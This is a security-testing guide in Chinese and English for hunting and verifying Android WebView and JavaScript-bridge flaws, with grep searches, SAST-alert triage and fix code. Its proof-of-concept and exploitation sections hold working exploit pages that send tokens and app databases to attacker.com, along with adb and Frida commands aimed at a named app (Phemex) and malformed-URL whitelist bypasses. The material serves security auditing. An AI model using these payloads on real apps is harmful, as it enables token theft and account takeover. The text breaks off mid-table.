# WebView Security Vulnerabilities Hunt

**双模式支持**:
- 🔍 **独立挖掘**: 从零开始查找 WebView 漏洞
- ✅ **报告验证**: 验证 SAST 工具报告中的 WebView 告警

---

## 📋 Part 1: 独立挖掘模式 (Independent Hunt)

### Vulnerability Type
WebView misconfigurations and JavaScript Bridge vulnerabilities

### Target Components
- Activities with WebView components
- JavaScript Bridge interfaces
- URL loading handlers
- File access configurations

### What to Look For

#### 1. JavaScript Bridge Exposure

**Pattern 1: Bridge Without Origin Verification**
```java
// VULNERABLE - Bridge accessible to ANY loaded URL
WebView webView = findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JavaScriptInterface(), "Android");
// No check on what URL is loaded!
```

**Pattern 2: Sensitive Data in Bridge**
```java
// VULNERABLE - Leaks credentials to JavaScript
class JavaScriptInterface {
    @JavascriptInterface
    public String getToken() {
        return getUserToken();  // Returns JWT to ANY page!
    }

    @JavascriptInterface
    public String getPassword() {
        return storedPassword;  // Extreme vulnerability!
    }
}
```

#### 2. URL Validation Bypass via Malformed Schemes

> **实战经验（Phemex v5.16.0 复测确认）**: 这是一个极其常见且容易被忽略的绕过方式。

**Pattern 3: startsWith-based URL Whitelist (Trivially Bypassable)**
```java
// VULNERABLE - startsWith can be bypassed with malformed URLs
public boolean isAllowedUrl(String url) {
    String lower = url.toLowerCase();
    return !(lower.startsWith("http://") || lower.startsWith("https://"))
        || lower.startsWith("https://trusted-domain.com/");
}
```

**绕过原理**: `startsWith("https://")` 要求双斜杠。攻击者使用畸形 scheme 绕过验证，而 WebView 会自动修正为合法 URL：

| 攻击 Payload | startsWith("https://") | g.a() 结果 | WebView 实际加载 |
|-------------|------------------------|-----------|----------------|
| `https:/evil.com` | `false` (单斜杠) | **通过（绕过）** | `https://evil.com` |
| `https:evil.com` | `false` (无斜杠) | **通过（绕过）** | `https://evil.com` |
| `https:\evil.com` | `false` (反斜杠) | **通过（绕过）** | `https://evil.com` |

**为什么 WebView 会修正**: Android WebView 内部使用的 URL 解析器（Chromium）比 Java 字符串匹配宽松得多，会将畸形 scheme 自动规范化为标准 `https://` 格式。

**正确的验证方式**:
```java
// SECURE - Use URI parsing instead of string matching
public boolean isAllowedUrl(String url) {
    try {
        URI uri = new URI(url);
        String scheme = uri.getScheme();
        String host = uri.getHost();
        if (scheme == null || host == null) return false;
        if (!scheme.equals("https")) return false;
        return host.equals("trusted-domain.com") || host.endsWith(".trusted-domain.com");
    } catch (URISyntaxException e) {
        return false;
    }
}
```

**Pattern 4: Open Redirect Bypass (Even After Fixing Validation)**

> ⚠️ 如果出现开放重定向漏洞也能绕过白名单（历史上出现过，不能保证以后不出现）

即使用 URI 解析修复了 Pattern 3，白名单域名上的开放重定向仍然可以绕过：
```
symbol = "https://trusted-domain.com/redirect?url=https://evil.com/steal"
```
- 通过白名单验证（以信任域名开头）
- WebView 携带认证头加载信任域名
- 302 重定向到 evil.com，认证头可能随请求传递

**防御需要在 WebView 层拦截跨域重定向**（见 Remediation 部分）。

#### 3. Unsafe WebView Settings

**Pattern 5: Universal File Access**
```java
// VULNERABLE - Allows file:// URLs to access any local file
webSettings.setAllowFileAccessFromFileURLs(true);
webSettings.setAllowUniversalAccessFromFileURLs(true);
```

**Pattern 6: Arbitrary URL Loading**
```java
// VULNERABLE - Loads attacker-controlled URL
String url = intent.getStringExtra("url");
webView.loadUrl(url);  // No validation!
```

#### 4. JavaScript Injection

**Pattern 7: Dynamic JavaScript Execution**
```java
// VULNERABLE - Evaluates untrusted JavaScript
String userScript = intent.getStringExtra("script");
webView.evaluateJavascript(userScript, null);
```

**Pattern 8: loadData with User Content**
```java
// VULNERABLE - Loads untrusted HTML
String html = intent.getStringExtra("html");
webView.loadData(html, "text/html", "UTF-8");
```

### Search Commands

```bash
# Find WebView usage
grep -r "WebView\|android.webkit" sources/

# Find JavaScript Bridge
grep -r "addJavascriptInterface\|@JavascriptInterface" sources/

# Find dangerous settings
grep -r "setJavaScriptEnabled\|setAllowFileAccess\|setAllowUniversalAccess" sources/

# Find URL loading
grep -r "loadUrl\|loadData\|loadDataWithBaseURL" sources/

# Find evaluateJavascript
grep -r "evaluateJavascript" sources/

# ⭐ Find URL validation using string matching (bypass-prone)
grep -r "startsWith.*http\|startsWith.*https" sources/
grep -r "contains.*http\|endsWith.*\.com" sources/

# ⭐ Find loadUrl with custom headers (auth header injection)
grep -r "loadUrl.*Map\|loadUrl.*HashMap\|loadUrl.*header" sources/
grep -r "put.*token\|put.*auth\|put.*session\|put.*cookie" sources/

# ⭐ Find WebViewClient redirect handling
grep -r "shouldOverrideUrlLoading\|shouldInterceptRequest\|onPageStarted" sources/
```

### Discovery Workflow

1. **Find WebView Activities** - grep for WebView class usage
2. **Locate Bridge Registration** - find addJavascriptInterface calls
3. **Check Bridge Methods** - analyze @JavascriptInterface methods
4. **Trace URL Sources** - find where loadUrl parameters come from
5. **Test Settings** - check dangerous configuration flags
6. **Generate PoC** - create malicious HTML to trigger

---

## ✅ Part 2: 报告验证模式 (Report Verification)

### Alert Identification (如何识别报告中的此类告警)

#### MobSF JSON Format

```json
{
  "code_analysis": {
    "findings": {
      "android_webview_addjavascriptinterface": [
        {
          "file": "com/app/WebViewActivity.java",
          "line": 45,
          "description": "JavaScript Interface detected",
          "severity": "warning"
        }
      ],
      "android_webview_load_url": [
        {
          "file": "com/app/WebViewActivity.java",
          "line": 78,
          "description": "WebView load URL from intent",
          "severity": "high"
        }
      ],
      "android_webview_file_access": [
        {
          "file": "com/app/WebViewActivity.java",
          "line": 52,
          "description": "setAllowFileAccessFromFileURLs enabled",
          "severity": "high"
        }
      ]
    }
  }
}
```

#### SonarQube XML Format

```xml
<issues>
  <issue key="security:webview-javascript-interface">
    <message>WebView JavaScript Interface exposes sensitive methods</message>
    <component>com.app.WebViewActivity</component>
    <line>45</line>
    <severity>CRITICAL</severity>
  </issue>

  <issue key="security:webview-arbitrary-url">
    <message>WebView loads URL from untrusted source</message>
    <component>com.app.WebViewActivity</component>
    <line>78</line>
    <severity>HIGH</severity>
  </issue>
</issues>
```

#### AI SAST Markdown Format (关键词匹配)

```markdown
## Finding 1: WebView JavaScript Bridge Vulnerability

**Location**: WebViewActivity.java:45
**Severity**: Critical
**Description**: The application registers a JavaScript interface that exposes sensitive methods (getToken, getUserInfo) without origin verification.

**Code**:
```java
webView.addJavascriptInterface(new Bridge(), "Android");
```
```

**识别关键词**:
- "WebView"
- "JavaScript Interface" / "addJavascriptInterface"
- "JavaScript Bridge"
- "arbitrary URL" / "untrusted URL"
- "file access" / "setAllowFileAccess"
- "loadUrl" / "loadData"
- "evaluateJavascript"

#### Qark JSON Format

```json
{
  "findings": [
    {
      "category": "webview",
      "name": "JavaScript Interface Detected",
      "severity": 3,
      "file": "WebViewActivity.java",
      "line_number": 45,
      "code_snippet": "addJavascriptInterface(new Bridge(), \"Android\")"
    }
  ]
}
```

### Verification Workflow (专业验证流程)

#### Step 1: Parse and Categorize Alert

**从报告中提取**:
- [ ] 文件路径 (e.g., `com/app/WebViewActivity.java`)
- [ ] 行号 (e.g., `45`)
- [ ] 告警类型 (Bridge / URL loading / File access / Settings)
- [ ] 代码片段（如果有）

**分类到子类型**:
```
WebView 告警 →
├─ Type A: JavaScript Bridge (addJavascriptInterface)
├─ Type B: URL Loading (loadUrl with external input)
├─ Type C: File Access (setAllowFileAccessFromFileURLs)
├─ Type D: JavaScript Injection (evaluateJavascript)
└─ Type E: Unsafe Settings (multiple flags)
```

#### Step 2: Locate and Read Code Context

```bash
# 定位到反编译代码
cd decompiled/sources/
find . -name "WebViewActivity.java" -exec cat {} \;

# 读取上下文（行号 ± 30 行）
sed -n '15,75p' com/app/WebViewActivity.java
```

**必须读取的关键部分**:
- [ ] **Activity onCreate** - 完整的 WebView 初始化代码
- [ ] **Bridge Class** - 所有 @JavascriptInterface 方法
- [ ] **WebViewClient** - shouldOverrideUrlLoading 实现
- [ ] **URL Source** - loadUrl 参数来源（Intent? API? Hardcoded?）
- [ ] **WebSettings** - 所有配置项

#### Step 3: Pattern Validation (排除误报)

##### Type A: JavaScript Bridge

**✅ TRUE POSITIVE (真实漏洞)**:
```java
// 1. Bridge 注册了
webView.addJavascriptInterface(new Bridge(), "Android");

// 2. Bridge 有敏感方法
class Bridge {
    @JavascriptInterface
    public String getToken() { return jwt; }  // 敏感！
}

// 3. 没有 origin 验证
String url = intent.getStringExtra("url");
webView.loadUrl(url);  // 任意 URL！
```

**❌ FALSE POSITIVE (误报)**:
```java
// 场景 1: 只加载信任域名（⚠️ 注意: startsWith 可被畸形URL绕过！）
if (url.startsWith("https://app.example.com")) {
    webView.loadUrl(url);
    // ⚠️ 看起来安全，但 "https:/evil.com" 绕过此检查！
    // 只有用 URI.parse() 做验证才是真正安全的
}

// 场景 2: Bridge 只有安全方法
class Bridge {
    @JavascriptInterface
    public String getAppVersion() {
        return BuildConfig.VERSION_NAME;  // 公开信息 → 安全
    }
}

// 场景 3: Bridge 在加载前移除
@Override
public void onPageStarted(WebView view, String url, Bitmap favicon) {
    view.removeJavascriptInterface("Android");  // 安全
    if (isTrustedUrl(url)) {
        view.addJavascriptInterface(new Bridge(), "Android");
    }
}
```

**判断标准**:
```
真实漏洞 = Bridge 注册 + 敏感方法 + (无 origin 验证 OR 任意 URL 加载)
```

##### Type B: Arbitrary URL Loading

**✅ TRUE POSITIVE**:
```java
// Intent 参数直接传入
String url = intent.getStringExtra("url");  // 外部可控
webView.loadUrl(url);  // 无验证 → 漏洞
```

**❌ FALSE POSITIVE**:
```java
// 场景 1: 有白名单验证
String url = intent.getStringExtra("url");
if (isWhitelisted(url)) {
    webView.loadUrl(url);  // 有验证 → 安全
}

// 场景 2: 硬编码 URL
webView.loadUrl("https://app.example.com/page");  // 固定 URL → 安全

// 场景 3: 只接受相对路径
String path = intent.getStringExtra("path");
webView.loadUrl("https://app.example.com/" + path);  // 相对安全
```

##### Type C: File Access

**✅ TRUE POSITIVE**:
```java
// 启用了危险设置
webSettings.setAllowFileAccessFromFileURLs(true);
webSettings.setAllowUniversalAccessFromFileURLs(true);

// 并且可以加载 file:// URL
String url = intent.getStringExtra("url");
webView.loadUrl(url);  // 可能加载 file:// → 漏洞
```

**❌ FALSE POSITIVE**:
```java
// 场景 1: 设置了但不加载外部 URL
webSettings.setAllowFileAccessFromFileURLs(true);
webView.loadUrl("file:///android_asset/index.html");  // 只加载 asset → 安全

// 场景 2: URL 有协议过滤
String url = intent.getStringExtra("url");
if (url.startsWith("https://")) {  // 只允许 HTTPS
    webView.loadUrl(url);  // 不会加载 file:// → 安全
}
```

#### Step 4: Data Flow Tracing (追踪攻击链)

**完整攻击链示例**:
```
Entry Point → Data Flow → Sink → Impact

Intent extra "url"
    ↓
getIntent().getStringExtra("url")
    ↓
webView.loadUrl(url)
    ↓
Loads https://attacker.com/exploit.html
    ↓
JavaScript calls window.Android.getToken()
    ↓
Token leaked to attacker
```

**必须确认的数据流**:
- [ ] **Source**: 外部输入（Intent / Deep link / API response）
- [ ] **Propagation**: 变量传递路径
- [ ] **Sink**: 危险方法调用（loadUrl / addJavascriptInterface）
- [ ] **Impact**: 敏感数据泄露 / 特权操作执行

**追踪方法**:
```bash
# 1. 找到 URL 来源
grep -A 5 "loadUrl" WebViewActivity.java | grep "intent\|Intent"

# 2. 追踪变量
grep "url\s*=" WebViewActivity.java

# 3. 检查验证逻辑
grep -B 10 "loadUrl" WebViewActivity.java | grep "if\|check\|valid"
```

#### Step 5: Exploitability Assessment

**评估可利用性**:

| 条件 | 检查项 | 可利用性 |
|------|-------|---------|
| **Entry Point** | Activity exported? | Yes → High |
| **URL Control** | Intent parameter? | Yes → High |
| **Bridge Exposure** | Sensitive methods? | Yes → Critical |
| **Origin Verification** | URL whitelist? | No → High |
| **User Interaction** | Auto-launch WebView? | Yes → High |

**CVSS 评分指导**:
```
Base Score = 7.5 (High)
  + Bridge leaks token → +1.5 → 9.0 (Critical)
  + Can execute privileged action → +0.3 → 9.3 (Critical)
  + No user interaction needed → +0.5
  - Requires exported Activity → -0.0 (still easy)
```

#### Step 6: PoC Generation (从报告到实际利用)

**根据漏洞类型生成 PoC**:

##### Scenario 1: Bridge Token Leak (Phemex 类型)

**报告信息**:
```
File: FirebasePushClickActivity.java
Line: 45 - addJavascriptInterface(new Bridge(), "JSBridge")
Line: 78 - loadUrl(intent.getStringExtra("routerUrl"))

Bridge methods:
- postMessage(String type) - Returns app info including JWT
```

**生成 PoC**:

```bash
# 1. 创建恶意 HTML
cat > poc.html <<'EOF'
<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<script>
// 检测 Bridge
if (window.JSBridge) {
    console.log('[EXPLOIT] Bridge found!');

    // 调用敏感方法
    var result = JSBridge.postMessage('getAppInfo');
    console.log('[TOKEN]', result);

    // 回传到攻击者服务器
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: result
    });
} else {
    console.log('[EXPLOIT] No bridge found');
}
</script>
<h1>PoC Page</h1>
</body>
</html>
EOF

# 2. 托管到 HTTPS（必需，Android 9+）
# 使用 GitHub Pages 或 ngrok

# 3. 触发漏洞
adb shell am start \
  -n com.phemex.app/.FirebasePushClickActivity \
  --es routerUrl "https://your-username.github.io/poc.html" \
  --es "google.message_id" "12345"

# 4. 监控输出
adb logcat | grep -E "EXPLOIT|TOKEN"
```

**预期输出**:
```
[chromium] [EXPLOIT] Bridge found!
[chromium] [TOKEN] {"token":"eyJhbGciOiJIUzI1NiIs...","userId":12345}
```

##### Scenario 2: URL Validation Bypass + Auth Header Leak (Phemex 类型)

**报告信息**:
```
File: PhemexWebView.java
Line: 557 - loadUrl(url, headerMap) injects auth headers to ALL URLs
Validation: g.a() uses startsWith("https://") - bypassable
```

**生成 PoC**:

```bash
# 1. 确认验证逻辑
grep -r "startsWith.*https://" sources/  # 找到 startsWith 验证
# 如果使用 startsWith("https://") → 可绕过

# 2. 测试畸形 URL 绕过（无需 Frida）
adb shell am start \
  -n com.phemex.app/.third.firebase.FirebasePushClickActivity \
  -a com.phemex.app.FirebasePushClickActivity \
  -c android.intent.category.DEFAULT \
  --es "google.message_id" "test_bypass" \
  --es "page" "h5" \
  --es "symbol" "https:/attacker.com/steal"
  # 注意: https:/ 单斜杠，不是 https://

# 3. 也可以测试其他变体
--es "symbol" "https:attacker.com/steal"    # 无斜杠
--es "symbol" "https:\\attacker.com/steal"  # 反斜杠

# 4. 用 Frida 确认 headers 被发送
frida -D emulator-5554 -n "Phemex" -l hook_loadurl.js
```

**Frida hook 脚本** (hook_loadurl.js):
```javascript
Java.perform(function() {
    var WebView = Java.use("android.webkit.WebView");
    WebView.loadUrl.overload('java.lang.String', 'java.util.Map').implementation = function(url, headers) {
        console.log("[URL] " + url);
        if (headers !== null) {
            var hm = Java.cast(headers, Java.use("java.util.HashMap"));
            var token = hm.get("phemex-auth-token");  // 或其他认证头名称
            if (token !== null) {
                console.log("[AUTH HEADER LEAKED TO] " + url);
                console.log("[TOKEN] " + token.toString().substring(0, 50) + "...");
            }
        }
        return this.loadUrl(url, headers);
    };
});
```

**预期输出**:
```
[URL] https:/attacker.com/steal
[AUTH HEADER LEAKED TO] https:/attacker.com/steal
[TOKEN] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHRyYSI6...
```

**验证要点**:
- WebView 是否将 `https:/` 规范化为 `https://` 并成功加载？
- loadUrl 是否注入了自定义 headers（特别是 auth token）？
- 截图确认页面加载成功

##### Scenario 3: File Access Vulnerability

**报告信息**:
```
File: WebViewActivity.java
Line: 52 - setAllowUniversalAccessFromFileURLs(true)
Line: 78 - loadUrl(intent.getStringExtra("url"))
```

**生成 PoC**:

```bash
# 1. 创建文件读取 HTML
cat > file_steal.html <<'EOF'
<script>
fetch('file:///data/data/com.app/databases/users.db')
    .then(r => r.arrayBuffer())
    .then(data => {
        // 转换为 base64
        var base64 = btoa(String.fromCharCode(...new Uint8Array(data)));

        // 回传数据库
        fetch('https://attacker.com/exfiltrate', {
            method: 'POST',
            body: JSON.stringify({db: base64})
        });
    });
</script>
EOF

# 2. Push 到设备
adb push file_steal.html /sdcard/

# 3. 触发加载
adb shell am start \
  -n com.app/.WebViewActivity \
  --es url "file:///sdcard/file_steal.html"

# 4. 检查文件访问
adb logcat | grep -i "fetch\|file://"
```

##### Scenario 4: JavaScript Injection

**报告信息**:
```
File: WebViewActivity.java
Line: 89 - evaluateJavascript(intent.getStringExtra("script"), null)
```

**生成 PoC**:

```bash
# 直接注入 JavaScript
adb shell am start \
  -n com.app/.WebViewActivity \
  --es script "window.Android.getToken()"

# 或复杂 payload
adb shell am start \
  -n com.app/.WebViewActivity \
  --es script "fetch('https://attacker.com/steal?data=' + window.Android.getUserInfo())"
```

#### Step 7: Dynamic Verification (实际测试)

**测试步骤**:

```bash
# 1. 安装 APK
adb install app.apk

# 2. 启动应用并登录（如果需要）
adb shell am start -n com.app/.MainActivity
# 手动登录...
# 按 Home 保持后台运行

# 3. 执行 PoC
adb shell am start -n com.app/.WebViewActivity \
  --es url "https://attacker.com/poc.html"

# 4. 监控 logcat (多个 filter)
adb logcat -c  # 清空日志
adb logcat | grep -E "chromium|WebView|EXPLOIT|TOKEN|ERROR"

# 5. 检查网络请求（如果需要）
adb shell tcpdump -i any -s 0 -w /sdcard/capture.pcap
# 分析是否有数据外传
```

**成功标志**:
- ✅ Logcat 显示 Bridge 调用成功
- ✅ Token/credentials 被打印
- ✅ 网络抓包显示数据外传
- ✅ 文件被成功读取

**失败排查**:
- ❌ Intent ignored → 检查是否有必需字段（参考 Phemex google.message_id）
- ❌ ERR_CLEARTEXT_NOT_PERMITTED → 使用 HTTPS
- ❌ Bridge undefined → 检查 Bridge 名称（Android? JSBridge? Bridge?）
- ❌ Empty result → 用户需要先登录

### Common False Positives (常见误报及识别)

| 报告描述 | 实际代码 | 判断 | 原因 |
|---------|---------|------|------|
| "addJavascriptInterface detected" | `addJavascriptInterface(new SafeBridge(), "Android")` + SafeBridge 只有 `getVersion()` | ❌ 误报 | Bridge 方法安全 |
| "WebView loads external URL" | `loadUrl(intent.getStringExtra("url"))` + URL 有白名单验证 | ❌ 误报 | 有 origin 验证 |
| "File access enabled" | `setAllowFileAccessFromFileURLs(true)` + 只加载 `file:///android_asset/` | ❌ 误报 | 只加载内部资源 |
| "JavaScript enabled" | `setJavaScriptEnabled(true)` 但没有 Bridge | ⚠️ 低危 | JS 启用但无暴露 |
| "loadData with user input" | `loadData(sanitizeHtml(input))` | ❌ 误报 | 有输入净化 |
| "Bridge exposes getToken()" | Bridge + URL whitelist + removeJavascriptInterface before load | ❌ 误报 | 动态控制 Bridge |
| "WebView arbitrary URL" | `loadUrl(intent.getStringExtra("url"))` + exported=false | ⚠️ 中危 | 需内部 Intent |
| "addJavascriptInterface" | Bridge + 只加载 HTTPS trusted domain | ✅ 真实 | Origin 验证可被绕过 |
| "WebView loads whitelisted URL" | `startsWith("https://trusted.com")` 白名单 | ⚠️ **可能真实** | startsWith 可被 `https:/evil.com` 绕过（见 Pattern 3） |
| "URL validation present" | 有 if 检查 URL | ⚠️ **需深入验证** | 检查是 startsWith 还是 URI 解析 |
| "WebView loadUrl with headers" | loadUrl(url, headerMap) 注入认证头 | ✅ **真实** | 若无 origin check，认证头会发到任何 URL |

**过滤误报的检查清单**:
- [ ] Bridge 方法是否真的敏感？（getToken vs getVersion）
- [ ] URL 是否有白名单验证？（检查 if 语句）
- [ ] **⭐ 白名单是否用 startsWith？（可被 `https:/` 单斜杠绕过！）**
- [ ] **⭐ 白名单是否用 URI 解析？（正确做法，不可绕过）**
- [ ] **⭐ loadUrl 是否注入自定义 headers？（检查 auth token 泄露）**
- [ ] **⭐ 信任域名是否可能存在开放重定向？**
- [ ] Bridge 是否动态控制？（检查 removeJavascriptInterface）
- [ ] Activity 是否 exported？（影响可利用性）
- [ ] 是否只加载内部资源？（asset, res）

### Severity Downgrade Scenarios (降级场景)

**Critical → High**:
- Bridge 泄露 token，但 Activity 未 exported（需其他 app 配合）

**High → Medium**:
- 有文件访问，但只能读取 public 目录（/sdcard）
- URL 可控，但无 Bridge（只是 XSS，无特权）

**Medium → Low**:
- JavaScript 启用，但无 Bridge、无外部 URL、无文件访问

**Low → Info**:
- WebView 完全隔离，只加载 asset，无任何外部交互

### Expected Verification Output (验证结果输出)

#### 真实漏洞示例

```markdown
## Verification Result: ✅ CONFIRMED VULNERABILITY

### Alert Information
- **Source**: MobSF Report
- **Rule ID**: android_webview_addjavascriptinterface
- **File**: com/phemex/app/third/firebase/FirebasePushClickActivity.java
- **Line**: 45, 78

### Vulnerability Confirmed
- **Type**: JavaScript Bridge Token Leak
- **Attack Vector**: Exported Activity + Arbitrary URL + Sensitive Bridge
- **CVSS**: 9.3 (Critical)

### Attack Chain
```
Entry: Exported Activity (no permission required)
  ↓
Intent parameter "routerUrl" → loadUrl(url)
  ↓
Attacker URL loaded with active Bridge
  ↓
JavaScript calls JSBridge.postMessage('getAppInfo')
  ↓
Returns JWT token + user info
  ↓
Complete account takeover
```

### PoC Execution
```bash
adb shell am start \
  -n com.phemex.app/.FirebasePushClickActivity \
  --es routerUrl "https://attacker.github.io/poc.html" \
  --es "google.message_id" "12345"
```

### Actual Result
```
[chromium] [EXPLOIT] Bridge found!
[chromium] [TOKEN] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
[chromium] [USER] {"id":12345,"email":"victim@example.com"}
```

### Impact
- ✅ JWT token stolen
- ✅ Full account access achieved
- ✅ User data exfiltrated
- ✅ No user interaction required (silent attack)

### Remediation
1. Add origin verification before exposing Bridge
2. Remove sensitive methods from Bridge
3. Validate routerUrl parameter
4. Add android:permission to Activity
```

#### 误报示例

```markdown
## Verification Result: ❌ FALSE POSITIVE

### Alert Information
- **Source**: SonarQube Report
- **Rule ID**: security:webview-javascript-interface
- **File**: com/app/InfoActivity.java
- **Line**: 67

### Analysis
- **Type**: JavaScript Bridge (Safe Methods Only)

### Code Review
```java
// Bridge 只暴露安全方法
class InfoBridge {
    @JavascriptInterface
    public String getAppVersion() {
        return BuildConfig.VERSION_NAME;  // Public info
    }

    @JavascriptInterface
    public String getPlatform() {
        return "Android";  // Public info
    }
}

// URL 加载有白名单
String url = intent.getStringExtra("url");
if (url != null && url.startsWith("https://app.example.com")) {
    webView.loadUrl(url);
}
```

### Conclusion
- ❌ No sensitive data exposed
- ❌ URL loading restricted to trusted domain
- ✅ Safe implementation

### Recommendation
- Accept risk (informational finding)
- No fix required
```

---

## 📚 Part 3: 通用部分 (Common Resources)

### Exploitation Strategy

#### Attack Vector 1: JavaScript Bridge Exploitation

```bash
# Step 1: Host malicious HTML
cat > exploit.html <<'EOF'
<script>
// Access exposed Bridge
if (window.Android) {
    // Steal sensitive data
    var token = Android.getToken();
    var userInfo = Android.getUserInfo();

    // Exfiltrate
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify({token, userInfo})
    });

    // Execute privileged actions
    Android.deleteAllData();
    Android.sendSMS('premium-number', 'subscribe');
}
</script>
EOF

# Step 2: Trigger vulnerable WebView
adb shell am start \
  -n com.app/.WebViewActivity \
  --es url "https://attacker.com/exploit.html"
```

#### Attack Vector 2: File Access Exploitation

```bash
# If setAllowUniversalAccessFromFileURLs(true)
cat > exploit.html <<'EOF'
<script>
// Read local files via file:// protocol
fetch('file:///data/data/com.app/databases/users.db')
    .then(r => r.text())
    .then(data => {
        // Exfiltrate database
        fetch('https://attacker.com/steal', {
            method: 'POST',
            body: data
        });
    });
</script>
EOF

# Load via file:// URL
adb push exploit.html /sdcard/
adb shell am start \
  -n com.app/.WebViewActivity \
  --es url "file:///sdcard/exploit.html"
```

#### Attack Vector 3: XSS via loadData

```bash
# Inject malicious HTML
adb shell am start \
  -n com.app/.WebViewActivity \
  --es html '<script>window.Android.getToken()</script>'
```

### Validation Checklist

#### JavaScript Bridge
- [ ] Bridge is registered (addJavascriptInterface)
- [ ] Bridge exposes sensitive methods
- [ ] No origin verification before exposing Bridge
- [ ] WebView loads untrusted URLs
- [ ] Can call Bridge methods from malicious page

#### WebView Settings
- [ ] JavaScript is enabled
- [ ] File access is enabled
- [ ] Universal access from file URLs is enabled
- [ ] Arbitrary URL loading without validation
- [ ] loadData/loadDataWithBaseURL with user input

#### Impact
- [ ] Can steal credentials/tokens
- [ ] Can execute privileged actions
- [ ] Can read local files
- [ ] Can perform CSRF on behalf of user

### CVSS Scoring Guidance

**Typical Score: 7.5 - 9.3 (High to Critical)**

| Metric | Value | Reasoning |
|--------|-------|-----------|
| AV | Network | Remote URL loading |
| AC | Low | Easy to exploit |
| PR | None | No authentication needed |
| UI | Required | User must open WebView |
| S | Changed | Accesses data outside WebView |
| C | High | Token/credential theft |
| I | High | Can execute privileged actions |
| A | Low/None | Usually doesn't affect availability |

Score is Critical (9.0+) if:
- Can steal authentication tokens
- Can execute SMS/calls
- Can access financial data

### Remediation

#### Fix 0 (P0): URL Validation - Use URI Parsing, NOT startsWith ⭐

> **实战教训**: `startsWith("https://")` 被 `https:/evil.com`（单斜杠）轻松绕过。这是最常见的验证错误。

```java
// ❌ VULNERABLE - startsWith can be bypassed
public boolean isAllowed(String url) {
    return url.toLowerCase().startsWith("https://trusted.com/");
    // "https:/evil.com" 不以 "https://" 开头 → 绕过!
    // WebView 自动修正为 "https://evil.com" → 加载成功!
}

// ✅ SECURE - URI parsing
private static final Set<String> TRUSTED_HOSTS = Set.of(
    "trusted.com", "www.trusted.com", "m.trusted.com"
);

public boolean isAllowed(String url) {
    try {
        URI uri = new URI(url);
        String scheme = uri.getScheme();
        String host = uri.getHost();
        if (scheme == null || host == null) return false;
        if (!scheme.equals("https")) return false;
        return TRUSTED_HOSTS.contains(host);
    } catch (URISyntaxException e) {
        return false;  // 畸形 URL 一律拒绝
    }
}
```

#### Fix 1: Origin Verification for Bridge

```java
// SECURE - Verify URL before exposing Bridge
public class SecureWebViewActivity extends Activity {
    private static final Set<String> TRUSTED_HOSTS = Set.of(
        "app.example.com", "www.example.com"
    );

    private boolean isTrustedUrl(String url) {
        try {
            URI uri = new URI(url);
            String host = uri.getHost();
            return host != null && TRUSTED_HOSTS.contains(host);
        } catch (Exception e) {
            return false;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        WebView webView = findViewById(R.id.webview);

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                String url = request.getUrl().toString();
                if (!isTrustedUrl(url)) {
                    Log.w(TAG, "Blocked untrusted URL: " + url);
                    return true;
                }
                return false;
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                view.removeJavascriptInterface("Android");
                if (isTrustedUrl(url)) {
                    view.addJavascriptInterface(new SecureBridge(), "Android");
                }
            }
        });

        String url = getIntent().getStringExtra("url");
        if (url != null && isTrustedUrl(url)) {
            webView.loadUrl(url);
        }
    }
}
```

#### Fix 2: Minimize Bridge Exposure

```java
// SECURE - Don't expose sensitive data
class SecureBridge {
    @JavascriptInterface
    public String getAppVersion() {
        return BuildConfig.VERSION_NAME;  // Safe, public info
    }

    @JavascriptInterface
    public boolean isLoggedIn() {
        return hasValidSession();  // Only status, not token
    }

    // DON'T expose:
    // - getToken()
    // - getPassword()
    // - getUserInfo()
    // - sendSMS()
    // - makeCall()
}
```

#### Fix 3: Secure WebView Settings

```java
// SECURE - Restrictive settings
WebSettings settings = webView.getSettings();

// JavaScript
settings.setJavaScriptEnabled(true);  // Only if absolutely necessary

// File access
settings.setAllowFileAccess(false);  // Disable file:// URLs
settings.setAllowFileAccessFromFileURLs(false);
settings.setAllowUniversalAccessFromFileURLs(false);

// Content access
settings.setAllowContentAccess(false);

// Geolocation
settings.setGeolocationEnabled(false);

// Database
settings.setDatabaseEnabled(false);
```

#### Fix 4: Input Validation for loadData

```java
// SECURE - Sanitize HTML before loading
public void loadHtml(String html) {
    // Strip dangerous tags
    html = html.replaceAll("<script[^>]*>.*?</script>", "");
    html = html.replaceAll("javascript:", "");
    html = html.replaceAll("on\\w+=\"[^\"]*\"", "");  // Remove event handlers

    // Use safe base URL
    webView.loadDataWithBaseURL(
        "about:blank",  // Restricted origin
        html,
        "text/html",
        "UTF-8",
        null
    );
}
```

#### Fix 5: Intercept Cross-Origin Redirects (Defense Against Open Redirect) ⭐

> ⚠️ 如果出现开放重定向漏洞也能绕过白名单（历史上出现过，不能保证以后不出现）。
> Fix 0-1 只保护初始请求。302 重定向时 loadUrl() 不会被再次调用，认证头可能随重定向传递。

```java
// SECURE - Strip sensitive headers on cross-origin redirect
private static final Set<String> SENSITIVE_HEADERS = Set.of(
    "phemex-auth-token", "authorization", "cookie",
    "bid", "x-device-info", "x-session-id"
);

webView.setWebViewClient(new WebViewClient() {
    @Override
    public WebResourceResponse shouldInterceptRequest(
            WebView view, WebResourceRequest request) {
        String host = request.getUrl().getHost();
        if (host != null && !TRUSTED_HOSTS.contains(host)) {
            // 跨域请求: 用干净连接替代，剥离认证头
            try {
                URL url = new URL(request.getUrl().toString());
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod(request.getMethod());
                for (Map.Entry<String, String> h : request.getRequestHeaders().entrySet()) {
                    if (!SENSITIVE_HEADERS.contains(h.getKey().toLowerCase())) {
                        conn.setRequestProperty(h.getKey(), h.getValue());
                    }
                }
                return new WebResourceResponse(
                    conn.getContentType(),
                    conn.getContentEncoding(),
                    conn.getInputStream()
                );
            } catch (Exception e) {
                return null;
            }
        }
        return null; // 可信域名走默认流程
    }
});
```

**完整防御体系**:

| 层级 | 防御点 | 解决的问题 |
|------|--------|-----------|
